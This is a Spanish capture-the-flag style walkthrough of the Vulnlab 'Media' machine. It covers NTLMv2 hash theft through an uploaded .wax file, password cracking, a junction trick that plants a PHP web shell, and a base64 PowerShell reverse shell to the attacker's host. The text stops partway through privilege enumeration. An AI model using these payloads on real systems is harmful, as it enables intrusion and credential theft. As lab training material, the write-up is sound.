---
layout: single
title: Media - Vulnlab
excerpt: "En este post vamos a resolver la máquina Media de la plataforma de Vulnlab en la que gracias a que un usuario está revisando archivos que subimos a la máquina obtendremos su hash NTLMv2 para crackearlo y poder conectarnos por ssh a la máquina víctima además estaremos abusando de Symlinks para subir una web shell y ganar acceso a la máquina además estaremos abusando de un .exe para obteneter todos los privilegios de un usuario y explotar el SetImpersonatePrivilege para obtener privilegios maximos como nt authority system."
date: 2024-03-01
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/Media-vulnlab/media.png
  teaser_home_page: true
categories:
  - Vulnlab
tags:  
  - SetImpersonatePrivilege
  - NTLMv2
  - Symlinks
---

## PortScan

- Comenzamos escaneando los puertos abiertos por el protocolo **TCP** de la máquina víctima.

```bash
➜  nmap nmap -sCV -p22,80,3389 10.10.73.104 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-29 12:52 CST
Nmap scan report for 10.10.73.104
Host is up (0.19s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 0b:b3:c0:80:40:88:e1:ae:aa:3b:5f:f4:c2:23:c0:0d (RSA)
|   256 e0:80:3f:dd:b1:f8:fc:83:f5:de:d5:b3:2d:5a:4b:39 (ECDSA)
|_  256 b5:32:c0:72:18:10:0f:24:5d:f8:e1:ce:2a:73:5c:1f (ED25519)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2023-10-09T13:41:32
|_Not valid after:  2024-04-09T13:41:32
| rdp-ntlm-info:
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2024-02-29T18:53:02+00:00
|_ssl-date: 2024-02-29T18:53:08+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Port 80 hash NTLMv2

- Vemos que está corriendo un servicio web y vemos las tecnologías que se están empleando.

```ruby
➜  nmap whatweb http://10.10.73.104
http://10.10.73.104 [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17], IP[10.10.73.104], OpenSSL[1.1.1t], PHP[8.1.17], Script, Title[ProMotion Studio], X-Powered-By[PHP/8.1.17]
```

- Esta es la página web.

<p align="center">
<img src="https://i.imgur.com/XOYElZE.png">
</p>

- Si bajamos observamos que tenemos algo interesante donde nos deja subir archivos.

<p align="center">
<img src="https://i.imgur.com/L6JoPu4.png">
</p>

- Bueno nos dice que por detrás debe de ser compatible con **Windows Media Player**.

<p align="center">
<img src="https://i.imgur.com/RJPzUju.png">
</p>

- Existe una herramienta que se llama <https://github.com/Greenwolf/ntlm_theft> que lo que hace es generar varios archivos los cuales funcionan para robar el **hash** **NTLMVv2** (NT LAN Manager) en este caso usaremos solo los que son compatibles que nos dicen en la página **web** <https://book.hacktricks.xyz/v/es/windows-hardening/ntlm> <https://github.com/Greenwolf/ntlm_theft> cuando la persona que está por detras revise el **.wax** que voy a subir durante el proceso de autenticación se va a generar el hash y no va a llegar vamos a instalar la herramienta.

```bash
➜  nmap pip3 install xlsxwriter
➜  nmap git clone https://github.com/Greenwolf/ntlm_theft
```

 - Con esto ya estaría.

```bash
➜  ntlm_theft git:(master) python3 ntlm_theft.py -g wax -s 10.8.1.127 -f stealhash
Created: stealhash/stealhash.wax (OPEN)
Generation Complete.
➜  ntlm_theft git:(master) ✗
```

- Aquí vemos el contenido.

```bash
➜  stealhash git:(master) ✗ cat stealhash.wax
https://10.8.1.127/test
file://\\10.8.1.127/steal/file%                                                                                                                    ➜  stealhash git:(master) ✗
```

- Vemos que la **url** aputan a un archivo en nuestro sistema que se llama **test** no es necesario que exista y después con **file** le indica que es un enlace a un archivo en el sistema de archivos local o una red compartida para que esto funcione podemos usar **responder** o **impacket-smbserver** para que nos llegue el **hash** en mi caso estaré empleando **impacket-smbserver**, pero puede ser con cualquiera de los 2.

```bash
➜  stealhash git:(master) ✗ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Ahora vamos a subir a la web él **.wax** que nos creó la herramienta.

<p align="center">
<img src="https://i.imgur.com/hRgbnnB.png">
</p>

- Una vez lo subimos vamos a esperar a que alguien por detrás lo revise para obtener su **hash** **Ntlmv2**.

<p align="center">
<img src="https://i.imgur.com/kkyMIjJ.png">
</p>

- Y bueno tenemos el **hash** del usuario **enox** vamos a crackearlo con **john** .

```bash
➜  stealhash git:(master) ✗ cat hash
enox::MEDIA:aaaaaaaaaaaaaaaa:7e3190c5c1f9db76bfc360f64ec94557:010100000000000000e4af7f456bda01121927e5fa2e588b0000000001001000430079006b006a00440078004100440003001000430079006b006a0044007800410044000200100064004100590064004d0074007a0065000400100064004100590064004d0074007a0065000700080000e4af7f456bda0106000400020000000800300030000000000000000000000000300000f56c0035a7b62431425b77bf8aa7260625be53589b34e8cddea5cc073973904c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0031002e003100320037000000000000000000
```

- Esta es la contraseña del usuario **enox** .

```bash
➜  stealhash git:(master) ✗ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (enox)
1g 0:00:00:42 DONE (2024-02-29 13:32) 0.02333g/s 311262p/s 311262c/s 311262C/s 1234ถ6789..1234mind
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

## Shell as enox 

- Como el puerto **22** que corresponde a **SSH** está abierto, vamos a conectarnos con las credenciales que tenemos.

```bash
➜  content ssh enox@10.10.73.104
The authenticity of host '10.10.73.104 (10.10.73.104)' can't be established.
ED25519 key fingerprint is SHA256:2c17FslY2rzanEFkyjgpzSQoyVlsRgRFVJv+0dkFt8A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.73.104' (ED25519) to the list of known hosts.
enox@10.10.73.104's password:
Microsoft Windows [Version 10.0.20348.1970]
(c) Microsoft Corporation. All rights reserved.

enox@MEDIA C:\Users\enox>whoami
media\enox

enox@MEDIA C:\Users\enox>
```

## User flag

- Como siempre en el **Desktop** del usuario se encuentra su flag.

```powershell
enox@MEDIA C:\Users\enox\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\enox\Desktop

10/02/2023  10:04 AM    <DIR>          .
10/02/2023  09:26 AM    <DIR>          ..
10/10/2023  02:58 AM                36 user.txt
               1 File(s)             36 bytes
               2 Dir(s)   8,547,569,664 bytes free
```

## Privilege Escalation

- En este directorio tenemos los archivos de la página web a donde subimos él **.wax** .

```bash
enox@MEDIA C:\xampp\htdocs>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\xampp\htdocs

10/02/2023  09:27 AM    <DIR>          .
10/02/2023  10:03 AM    <DIR>          ..
10/02/2023  09:27 AM    <DIR>          assets
10/02/2023  09:27 AM    <DIR>          css
10/10/2023  04:00 AM            20,563 index.php
10/02/2023  09:27 AM    <DIR>          js
               1 File(s)         20,563 bytes
               5 Dir(s)   8,547,749,888 bytes free

enox@MEDIA C:\xampp\htdocs>
```

- Este es el codigo fuente:

```php
enox@MEDIA C:\xampp\htdocs>type index.php
<?php
error_reporting(0);

    // Your PHP code for handling form submission and file upload goes here.
    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory

    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
        $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
        $lastname = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
        $email = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
        $folderName = md5($firstname . $lastname . $email);

        // Create the full upload directory path
        $targetDir = $uploadDir . $folderName . '/';

        // Ensure the directory exists; create it if not
        if (!file_exists($targetDir)) {
            mkdir($targetDir, 0777, true);
        }

        // Sanitize the filename to remove unsafe characters
        $originalFilename = $_FILES["fileToUpload"]["name"];
        $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);


        // Build the full path to the target file
        $targetFile = $targetDir . $sanitizedFilename;

        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo "<script>alert('Your application was successfully submitted. Our HR shall review your video and get back to you.');</script>";

            // Update the todo.txt file
            $todoFile = $uploadDir . 'todo.txt';
            $todoContent = "Filename: " . $originalFilename . ", Random Variable: " . $folderName . "\n";

            // Append the new line to the file
            file_put_contents($todoFile, $todoContent, FILE_APPEND);
        } else {
            echo "<script>alert('Uh oh, something went wrong... Please submit again');</script>";
        }
    }
    ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>ProMotion Studio</title>
    <!-- Favicon-->
    <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
    <!-- Font Awesome icons (free version)-->
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    <!-- Google fonts-->
    <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css" />
    <link href="https://fonts.googleapis.com/css?family=Roboto+Slab:400,100,300,700" rel="stylesheet" type="text/css" />
    <!-- Core theme CSS (includes Bootstrap)-->
    <link href="css/styles.css" rel="stylesheet" />
</head>

<body id="page-top">
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-dark fixed-top" id="mainNav">
        <div class="container">
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars ms-1"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav text-uppercase ms-auto py-4 py-lg-0">
                    <li class="nav-item"><a class="nav-link" href="#services">Services</a></li>
                    <li class="nav-item"><a class="nav-link" href="#about">About</a></li>
                    <li class="nav-item"><a class="nav-link" href="#team">Team</a></li>
                    <li class="nav-item"><a class="nav-link" href="#contact">Hiring</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- Masthead-->
    <header class="masthead">
        <div class="container">
            <div class="masthead-subheading">Welcome To Our Studio!</div>
            <div class="masthead-heading text-uppercase">It's Nice To Meet You</div>
            <a class="btn btn-primary btn-xl text-uppercase" href="#services">Tell Me More</a>
        </div>
    </header>
    <!-- Services-->
    <section class="page-section" id="services">
        <div class="container">
            <div class="text-center">
                <h2 class="section-heading text-uppercase">Services</h2>
                <h3 class="section-subheading text-muted">Professional Services</h3>
            </div>
            <div class="row text-center">
                <div class="col-md-4">
                    <span class="fa-stack fa-4x">
                        <i class="fas fa-circle fa-stack-2x text-primary"></i>
                        <i class="fas fa-shopping-cart fa-stack-1x fa-inverse"></i>
                    </span>
                    <h4 class="my-3">E-Commerce Solutions</h4>
                    <p class="text-muted">Enhance your online business with our cutting-edge e-commerce solutions. We
                        provide a seamless shopping experience for your customers, from product selection to secure
                        checkout.</p>
                </div>
                <div class="col-md-4">
                    <span class="fa-stack fa-4x">
                        <i class="fas fa-circle fa-stack-2x text-primary"></i>
                        <i class="fas fa-laptop fa-stack-1x fa-inverse"></i>
                    </span>
                    <h4 class="my-3">Responsive Web Design</h4>
                    <p class="text-muted">Our websites are built with responsive design in mind, ensuring that your site
                        looks and works flawlessly on any device. Reach a wider audience and improve user satisfaction
                        with our designs.</p>
                </div>
                <div class="col-md-4">
                    <span class="fa-stack fa-4x">
                        <i class="fas fa-circle fa-stack-2x text-primary"></i>
                        <i class="fas fa-lock fa-stack-1x fa-inverse"></i>
                    </span>
                    <h4 class="my-3">Robust Web Security</h4>
                    <p class="text-muted">Protect your online presence with our state-of-the-art web security solutions.
                        We prioritize the safety of your data and user information, keeping your website and customers
                        secure.</p>
                </div>
            </div>
        </div>
    </section>
    <!-- About-->
    <section class="page-section" id="about">
        <div class="container">
            <div class="text-center">
                <h2 class="section-heading text-uppercase">About Us</h2>
                <h3 class="section-subheading text-muted">Discover our journey and milestones.</h3>
            </div>
            <ul class="timeline">
                <li>
                    <div class="timeline-image"><img class="rounded-circle img-fluid" src="assets/img/about/1.jpg"
                            alt="Our Humble Beginnings" /></div>
                    <div class="timeline-panel">
                        <div class="timeline-heading">
                            <h4>2017-2020</h4>
                            <h4 class="subheading">Our Humble Beginnings</h4>
                        </div>
                        <div class="timeline-body">
                            <p class="text-muted">In the early years, our journey began with a small team of passionate
                                individuals. We embarked on a mission to deliver innovative solutions, and our
                                dedication soon started to bear fruit.</p>
                        </div>
                    </div>
                </li>
                <li class="timeline-inverted">
                    <div class="timeline-image"><img class="rounded-circle img-fluid" src="assets/img/about/2.jpg"
                            alt="An Agency is Born" /></div>
                    <div class="timeline-panel">
                        <div class="timeline-heading">
                            <h4>March 2021</h4>
                            <h4 class="subheading">An Agency is Born</h4>
                        </div>
                        <div class="timeline-body">
                            <p class="text-muted">In March 2021, our agency officially came into existence. With a clear
                                vision and determination, we transformed into a full-fledged agency, ready to serve our
                                clients with excellence.</p>
                        </div>
                    </div>
                </li>
                <li>
                    <div class="timeline-image"><img class="rounded-circle img-fluid" src="assets/img/about/3.jpg"
                            alt="Transition to Full Service" /></div>
                    <div class="timeline-panel">
                        <div class="timeline-heading">
                            <h4>December 2022</h4>
                            <h4 class="subheading">Transition to Full Service</h4>
                        </div>
                        <div class="timeline-body">
                            <p class="text-muted">By December 2022, we had evolved into a full-service agency, offering
                                a wide range of solutions to meet our clients' diverse needs. Our commitment to quality
                                remained unwavering.</p>
                        </div>
                    </div>
                </li>
                <li class="timeline-inverted">
                    <div class="timeline-image"><img class="rounded-circle img-fluid" src="assets/img/about/4.jpg"
                            alt="Phase Two Expansion" /></div>
                    <div class="timeline-panel">
                        <div class="timeline-heading">
                            <h4>July 2023</h4>
                            <h4 class="subheading">Phase Two Expansion</h4>
                        </div>
                        <div class="timeline-body">
                            <p class="text-muted">In July 2023, we embarked on an exciting phase of expansion. With new
                                opportunities on the horizon, we're dedicated to delivering even greater value to our
                                clients and partners.</p>
                        </div>
                    </div>
                </li>
                <li class="timeline-inverted">
                    <div class="timeline-image">
                        <h4>
                            Be Part
                            <br />
                            Of Our
                            <br />
                            Success Story!
                        </h4>
                    </div>
                </li>
            </ul>
        </div>
    </section>

    <!-- Team-->
    <section class="page-section bg-light" id="team">
        <div class="container">
            <div class="text-center">
                <h2 class="section-heading text-uppercase">Meet Our Dedicated Team</h2>
                <h3 class="section-subheading text-muted">Get to know the talented individuals behind our success.</h3>
            </div>
            <div class="row">
                <div class="col-lg-4">
                    <div class="team-member">
                        <img class="mx-auto rounded-circle" src="assets/img/team/1.jpg" alt="Parveen Anand" />
                        <h4>Parveen Anand</h4>
                        <p class="text-muted">Lead Designer</p>
                        <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Parveen Anand Twitter Profile"><i
                                class="fab fa-twitter"></i></a>
                        <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Parveen Anand Facebook Profile"><i
                                class="fab fa-facebook-f"></i></a>
                        <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Parveen Anand LinkedIn Profile"><i
                                class="fab fa-linkedin-in"></i></a>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="team-member">
                        <img class="mx-auto rounded-circle" src="assets/img/team/2.jpg" alt="Diana Petersen" />
                        <h4>Diana Petersen</h4>
                        <p class="text-muted">Lead Marketer</p>
                        <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Diana Petersen Twitter Profile"><i
                                class="fab fa-twitter"></i></a>
                        <a class="btn btn-dark btn-social mx-2" href="#!"
                            aria-label="Diana Petersen Facebook Profile"><i class="fab fa-facebook-f"></i></a>
                        <a class="btn btn-dark btn-social mx-2" href="#!"
                            aria-label="Diana Petersen LinkedIn Profile"><i class="fab fa-linkedin-in"></i></a>
                    </div>
                </div>
                <div class="col-lg-4">
                    <div class="team-member">
                        <img class="mx-auto rounded-circle" src="assets/img/team/3.jpg" alt="Larry Parker" />
                        <h4>Larry Parker</h4>
                        <p class="text-muted">Lead Developer</p>
                        <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Larry Parker Twitter Profile"><i
                                class="fab fa-twitter"></i></a>
                        <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Larry Parker Facebook Profile"><i
                                class="fab fa-facebook-f"></i></a>
                        <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Larry Parker LinkedIn Profile"><i
                                class="fab fa-linkedin-in"></i></a>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-lg-8 mx-auto text-center">
                    <p class="large text-muted">Our team is passionate about creating exceptional experiences for our
                        clients. We take pride in our work and collaborate to deliver outstanding results that make a
                        difference.</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Clients -->
    <div class="py-5">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-md-3 col-sm-6 my-3">
                    <a href="#!"><img class="img-fluid img-brand d-block mx-auto" src="assets/img/logos/microsoft.svg"
                            alt="Microsoft Logo" aria-label="Microsoft Logo" /></a>
                </div>
                <div class="col-md-3 col-sm-6 my-3">
                    <a href="#!"><img class="img-fluid img-brand d-block mx-auto" src="assets/img/logos/google.svg"
                            alt="Google Logo" aria-label="Google Logo" /></a>
                </div>
                <div class="col-md-3 col-sm-6 my-3">
                    <a href="#!"><img class="img-fluid img-brand d-block mx-auto" src="assets/img/logos/facebook.svg"
                            alt="Facebook Logo" aria-label="Facebook Logo" /></a>
                </div>
                <div class="col-md-3 col-sm-6 my-3">
                    <a href="#!"><img class="img-fluid img-brand d-block mx-auto" src="assets/img/logos/ibm.svg"
                            alt="IBM Logo" aria-label="IBM Logo" /></a>
                </div>
            </div>
        </div>
    </div>

    <!-- Contact -->
    <section class="page-section" id="contact">
        <div class="container">
            <div class="text-center">
                <h2 class="section-heading text-uppercase">Join Our Team</h2>
                <h3 class="section-heading text-uppercase">We're Hiring Graphics Designers!</h3>
            </div>
            <form id="contactForm" data-sb-form-api-token="API_TOKEN" action="<?php echo htmlspecialchars($_SERVER["
                PHP_SELF"]); ?>" method="post" enctype="multipart/form-data">
                <div class="row align-items-stretch mb-5">
                    <div class="col-md-6">
                        <div class="form-group">
                            <!-- First Name input -->
                            <input class="form-control" id="firstname" name="firstname" type="text"
                                placeholder="Your First Name *" data-sb-validations="required" />
                            <div class="invalid-feedback" data-sb-feedback="firstname:required">First name is required.
                            </div>
                        </div>
                        <div class="form-group">
                            <!-- Last Name input -->
                            <input class="form-control" id="lastname" name="lastname" type="text"
                                placeholder="Your Last Name *" data-sb-validations="required" />
                            <div class="invalid-feedback" data-sb-feedback="lastname:required">Last name is required.
                            </div>
                        </div>
                        <div class="form-group">
                            <!-- Email address input -->
                            <input class="form-control" id="email" name="email" type="email" placeholder="Your Email *"
                                data-sb-validations="required,email" />
                            <div class="invalid-feedback" data-sb-feedback="email:required">An email is required.</div>
                            <div class="invalid-feedback" data-sb-feedback="email:email">Email is not valid.</div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="form-group">
                            <!-- Video upload input -->
                            <small class="form-text text-white">Upload a brief introduction video (compatible with
                                Windows Media Player):</small>
                            <input class="form-control" id="fileToUpload" name="fileToUpload" type="file"
                                accept="video/*" data-sb-validations="required" />
                            <div class="invalid-feedback" data-sb-feedback="fileToUpload:required">A video is required.
                            </div>
                            <small class="form-text text-white">Please upload a brief introduction video about yourself
                                and your experiences, explaining why you think you're fit for the job.</small>
                        </div>
                    </div>
                </div>
                <!-- Submit Button -->
                <div class="text-center">
                    <input class="btn btn-primary btn-xl text-uppercase" type="submit" value="Upload File"
                        name="submit">
                </div>
            </form>
        </div>
    </section>

    <!-- Footer-->
    <footer class="footer py-4">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-lg-4 text-lg-start">Copyright &copy; ProMotion Studios 2023</div>
                <div class="col-lg-4 my-3 my-lg-0">
                    <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Twitter"><i
                            class="fab fa-twitter"></i></a>
                    <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="Facebook"><i
                            class="fab fa-facebook-f"></i></a>
                    <a class="btn btn-dark btn-social mx-2" href="#!" aria-label="LinkedIn"><i
                            class="fab fa-linkedin-in"></i></a>
                </div>
                <div class="col-lg-4 text-lg-end">
                    <a class="link-dark text-decoration-none me-3" href="#!">Privacy Policy</a>
                    <a class="link-dark text-decoration-none" href="#!">Terms of Use</a>
                </div>
            </div>
        </div>
    </footer>
    <!-- Bootstrap core JS-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Core theme JS-->
    <script src="js/scripts.js"></script>
</body>

</html>
enox@MEDIA C:\xampp\htdocs>
```

- Este es el código todo lo que subimos se guarda en la ruta `C:/Windows/Tasks/Uploads/`, pero lo que ingresamos lo convierte en **MD5** por ejemplo nosotros ingresamos **test** en todo entonces se supone que lo debería hacer de la siguiente manera: fuente:

```bash
➜  ~ echo -n "testtesttest@test.com" | md5sum
44b85c98e94039c8a0a015f6d3a3449e  -
➜  ~
```

- Una forma de asegurar esto es ver el contenido de la ruta donde se guardan y ver si ingresan los datos, de esta manera se guardan en **MD5**.

- Y bueno, al parecer si lo hace.

```bash
enox@MEDIA C:\Windows\Tasks\Uploads>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Windows\Tasks\Uploads

02/29/2024  11:28 AM    <DIR>          .
10/02/2023  10:04 AM    <DIR>          ..
02/29/2024  11:27 AM    <DIR>          44b85c98e94039c8a0a015f6d3a3449e
02/29/2024  11:28 AM                 0 todo.txt
               1 File(s)              0 bytes
               3 Dir(s)   8,547,569,664 bytes free

enox@MEDIA C:\Windows\Tasks\Uploads>
```

- Vamos a crear un enlace simbólico a la ruta `C:\xampp\htdocss`  para poder subir nuestra web shell con **mlink** <https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/mklink> .

- Primero vamos a borrar el directorio generado.

```powershell
enox@MEDIA C:\xampp\htdocs>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\xampp\htdocs> rmdir C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e\

Confirm
The item at C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e\ has children and the Recurse parameter was not specified. If you continue,
all children will be removed with the item. Are you sure you want to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): Y
PS C:\xampp\htdocs>
```

- Ahora creamos el enlace desde la **cmd**.

```powershell
enox@MEDIA C:\xampp\htdocs>mklink /J C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e C:\xampp\htdocss
Junction created for C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e <<===>> C:\xampp\htdocss

enox@MEDIA C:\xampp\htdocs>
```

- Con esto lo que logramos es que el directorio **44b85c98e94039c8a0a015f6d3a3449e** está en **C:\xampp\htdocss**, ya que se creó el **Juction** ahora vamos a hacer él **.php** para enviarnos la reverse shell.

```php
➜  ~ cat cmd.php
<?php
	system($_GET['cmd']);
?>
```

- Ahora, con los mismos valores que teníamos con **test** en la parte del **MD5** vamos a subir la **shell**.

<p align="center">
<img src="https://i.imgur.com/2JDcTIi.png">
</p>

- Y vemos que tenemos él **.php** .

```bash
enox@MEDIA C:\xampp\htdocs>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\xampp\htdocs

03/01/2024  01:21 PM    <DIR>          .
03/01/2024  01:12 PM    <DIR>          ..
10/02/2023  09:27 AM    <DIR>          assets
03/01/2024  01:21 PM                32 cmd.php
10/02/2023  09:27 AM    <DIR>          css
10/10/2023  04:00 AM            20,563 index.php
10/02/2023  09:27 AM    <DIR>          js
               2 File(s)         20,595 bytes
               5 Dir(s)   8,555,507,712 bytes free

enox@MEDIA C:\xampp\htdocs>
```

<p align="center">
<img src="https://i.imgur.com/7Q5JXSq.png">
</p>

## Shell as nt authority\local 

- Ahora nos ponemos en escucha para enviarnos una reverse shell.

```bash
➜  ~ rlwrap nc -lvnp 443
listening on [any] 443 ...
```

- Vamos a utilizar el siguiente recurso para crear el oneliner en powershell usando **base64** . <https://www.revshells.com/>.

```powershell
http://10.10.111.108/cmd.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEALgAxADIANwAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

-  Nos llega la **shell** .

```bash
➜  ~ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.8.1.127] from (UNKNOWN) [10.10.111.108] 50309
whoami
nt authority\local service
PS C:\xampp\htdocs>
```

- Verificamos que no tenemos todos los privilegios máximos.

```bash
PS C:\xampp\htdocs> whoami /all

USER INFORMATION
----------------

User Name                  SID
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                                                              Attributes
====================================== ================ ================================================================================================ ==================================================
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                            
Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-1488445330-856673777-1515413738-1380768593-2977925950-2228326386-886087428-2802422674   Mandatory group, Enabled by default, Enabled group
                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
